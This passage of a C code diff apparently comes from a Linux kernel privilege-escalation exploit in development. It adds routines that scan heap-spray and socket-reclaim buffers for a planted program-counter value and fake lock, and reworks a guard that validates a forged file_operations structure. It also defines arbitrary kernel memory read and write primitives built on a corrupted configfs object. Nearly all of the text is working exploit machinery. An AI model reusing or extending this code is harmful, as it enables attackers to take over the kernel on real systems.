+                 tag ? tag : "-", nd >= 0 ? nd : 0, n, band[0],
+                 (unsigned long long)w[0], (unsigned long long)w[1],
+                 (unsigned long long)w[2], (unsigned long long)w[3],
+                 (unsigned long long)w[4], (unsigned long long)w[5],
+                 (unsigned long long)w[6], (unsigned long long)w[7],
+                 (unsigned long long)w[8]);
+    }
+  }
+
+  {
+    int fds[1 + SKB_RECLAIM_SENDS];
+    int nfds = 0;
+    fds[nfds++] = g_payload_peek_fd;
+    for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
+      fds[nfds++] = reclaim_sv[i][1];
+    }
+    for (int k = 0; k < nfds; k++) {
+      if (fds[k] < 0) {
+        continue;
+      }
+      static unsigned char peekbuf[0x2400];
+      ssize_t rd =
+          recv(fds[k], peekbuf, sizeof(peekbuf), MSG_PEEK | MSG_DONTWAIT);
+      if (rd <= 0) {
+        continue;
+      }
+      uint64_t v[9] = {0};
+      for (int i = 0; i < 9; i++) {
+        size_t po = band[i] + delta;
+        if (po + sizeof(uint64_t) <= (size_t)rd) {
+          memcpy(&v[i], peekbuf + po, sizeof(v[i]));
+        }
+      }
+      pr_warning("v122 W-band tag=%s src=B idx=%d n=%d off=0x%zx "
+                 "w=[%016llx %016llx %016llx %016llx %016llx %016llx "
+                 "%016llx %016llx %016llx]\n",
+                 tag ? tag : "-", k, nfds, stream_off, (unsigned long long)v[0],
+                 (unsigned long long)v[1], (unsigned long long)v[2],
+                 (unsigned long long)v[3], (unsigned long long)v[4],
+                 (unsigned long long)v[5], (unsigned long long)v[6],
+                 (unsigned long long)v[7], (unsigned long long)v[8]);
+    }
+  }
+}
+
+void util_stack_page_scan(const char *tag, uint64_t pcv) {
+  static int on = -1;
+  if (on < 0) {
+    on = env_flag("SLIDE_PHASE_OBS", 0);
+  }
+  if (!on) {
+    return;
+  }
+  const uint64_t lockv = fake_lock;
+  const size_t delta = (size_t)(-SKB_DATA_DELTA);
+
+  {
+    uint64_t gA = 0, lA = 0;
+    int hitA = -1;
+    for (int s = 0; s < frame_oracle_spray_n; s++) {
+      unsigned char *m = frame_oracle_spray[s];
+      size_t len = frame_oracle_spray_len[s];
+      if (len > 4u << 20) {
+        len = 4u << 20;
+      }
+      for (size_t off = 0; off + 8 <= len; off += 8) {
+        uint64_t v = 0;
+        memcpy(&v, m + off, sizeof(v));
+        if (v == pcv) {
+          gA = (uint64_t)off;
+          memcpy(&lA, m + off + 0x38, sizeof(lA));
+          hitA = lA == lockv ? 1 : 0;
+          break;
+        }
+      }
+      if (gA) {
+        break;
+      }
+    }
+    pr_warning("v135 ghost tag=%s src=A pc=%016llx ghost_off=0x%llx "
+               "lock_at_ghost=0x%llx lockv=0x%llx hit=%d\n",
+               tag ? tag : "-", (unsigned long long)pcv, (unsigned long long)gA,
+               (unsigned long long)lA, (unsigned long long)lockv, hitA);
+  }
+
+  {
+    int fds[1 + SKB_RECLAIM_SENDS];
+    int nfds = 0;
+    fds[nfds++] = g_payload_peek_fd;
+    for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
+      fds[nfds++] = reclaim_sv[i][1];
+    }
+    for (int k = 0; k < nfds; k++) {
+      if (fds[k] < 0) {
+        continue;
+      }
+      static unsigned char peekbuf[SKB_SEND_SIZE];
+      ssize_t rd =
+          recv(fds[k], peekbuf, sizeof(peekbuf), MSG_PEEK | MSG_DONTWAIT);
+      if (rd <= 0) {
+        continue;
+      }
+      uint64_t gB = 0, lB = 0;
+      int hitB = -1;
+      for (size_t off = 0; off + 8 <= (size_t)rd; off += 8) {
+        uint64_t v = 0;
+        memcpy(&v, peekbuf + off, sizeof(v));
+        if (v == pcv) {
+          gB = (uint64_t)off;
+          memcpy(&lB, peekbuf + off + 0x38, sizeof(lB));
+          hitB = lB == lockv ? 1 : 0;
+          break;
+        }
+      }
+      uint64_t s0 = 0, s1 = 0;
+      if (0x3b48 + 8 <= (size_t)rd) {
+        memcpy(&s0, peekbuf + 0x3b48, sizeof(s0));
+      }
+      if (0x7b48 + 8 <= (size_t)rd) {
+        memcpy(&s1, peekbuf + 0x7b48, sizeof(s1));
+      }
+      pr_warning("v135 ghost tag=%s src=B idx=%d n=%d pc=%016llx "
+                 "ghost_off=0x%llx lock_at_ghost=0x%llx lockv=0x%llx "
+                 "hit=%d slotA(0x3b48)=0x%llx slotB(0x7b48)=0x%llx "
+                 "rd=%zd delta=0x%zx\n",
+                 tag ? tag : "-", k, nfds, (unsigned long long)pcv,
+                 (unsigned long long)gB, (unsigned long long)lB,
+                 (unsigned long long)lockv, hitB, (unsigned long long)s0,
+                 (unsigned long long)s1, rd, delta);
+    }
+  }
 }
 
 int util_frame_guard(int probe_fd) {
@@ -871,17 +1472,16 @@ int util_frame_guard(int probe_fd) {
   int attempts = env_int_range("SLIDE_FRAME_REGRAB", 4, 1, 16);
   uint64_t owner = 0;
   uint64_t openv = 0;
+  int probe_live = 0;
   for (int a = 1; a <= attempts; a++) {
-    int sent = util_frame_regrab_burst();
+    util_frame_regrab_burst();
     ssize_t rd1 = configfs_read_once(probe_fd, fake_fops + FOPS_OWNER_OFF,
                                      &owner, sizeof(owner));
     ssize_t rd2 = configfs_read_once(probe_fd, fake_fops + FOPS_OPEN_OFF,
                                      &openv, sizeof(openv));
-    pr_info("v105 frame check attempt=%d/%d owner=%016llx open=%016llx "
-            "(expect owner=%016llx open=%016llx) rd=%zd/%zd sent=%d\n",
-            a, attempts, (unsigned long long)owner,
-            (unsigned long long)openv, (unsigned long long)owner_expect,
-            (unsigned long long)open_expect, rd1, rd2, sent);
+    if (rd1 == (ssize_t)sizeof(owner) || rd2 == (ssize_t)sizeof(openv)) {
+      probe_live = 1;
+    }
     if (rd1 == (ssize_t)sizeof(owner) && rd2 == (ssize_t)sizeof(openv) &&
         owner == owner_expect && openv == open_expect) {
       return 1;
@@ -890,13 +1490,34 @@ int util_frame_guard(int probe_fd) {
       usleep(100000);
     }
   }
-  pr_warning("v105 frame-foreign owner=%llx -> %s\n",
-             (unsigned long long)owner,
-             gate_mode ? "park" : "canary-continue");
-  return gate_mode ? 0 : 1;
+  int owned = util_frame_oracle("guard");
+  if (gate_mode) {
+    pr_warning("v105 frame-foreign owner=%llx -> park\n",
+               (unsigned long long)owner);
+    return 0;
+  }
+  if (env_flag("SLIDE_FRAME_GUARD_ORACLE", 1) && owned != 1) {
+    pr_warning("v113 frame-guard: oracle=%d owner=%llx -> park without "
+               "openat\n",
+               owned, (unsigned long long)owner);
+    return 0;
+  }
+  if (!probe_live) {
+    static int v113_warned;
+    if (!v113_warned) {
+      v113_warned = 1;
+      pr_warning("v105 canary-continue (probe f_op not configfs => "
+                 "verdict structurally unavailable)\n");
+    }
+  } else {
+    pr_warning("v105 frame-foreign owner=%llx -> canary-continue\n",
+               (unsigned long long)owner);
+  }
+  return 1;
 }
 
-ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
+ssize_t configfs_write_once(int fd, uintptr_t target, const void *data,
+                            size_t len) {
   unsigned char blob[128];
   memset(blob, 0, sizeof(blob));
   put64(blob, CFG_BIN_BUFFER_OFF - CFG_NAME_BIAS, target);
@@ -933,9 +1554,7 @@ ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
   return rd;
 }
 
-int is_kernel_ptr(uintptr_t value) {
-  return value >= 0xffff800000000000ULL;
-}
+int is_kernel_ptr(uintptr_t value) { return value >= 0xffff800000000000ULL; }
 
 int is_direct_ptr(uintptr_t value) {
   return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
@@ -950,14 +1569,14 @@ uint64_t kernel_read64(int fd, uintptr_t target) {
   return value;
 }
 
-ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
+ssize_t kernel_write_data(int fd, uintptr_t target, const void *data,
+                          size_t len) {
   return configfs_write_once(fd, target, data, len);
 }
 
 ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
   return configfs_read_once(fd, target, data, len);
 }
-
 
 int env_flag(const char *name, int def) {
   const char *v = getenv(name);
@@ -987,6 +1606,6 @@ int env_int_range(const char *name, int def, int min, int max) {
   return (int)parsed;
 }
 
-int payload_peek_fd(void) {
-  return g_payload_peek_fd;
-}
+int payload_peek_fd(void) { return g_payload_peek_fd; }
+
+const unsigned char *payload_template(void) { return skb_buf; }
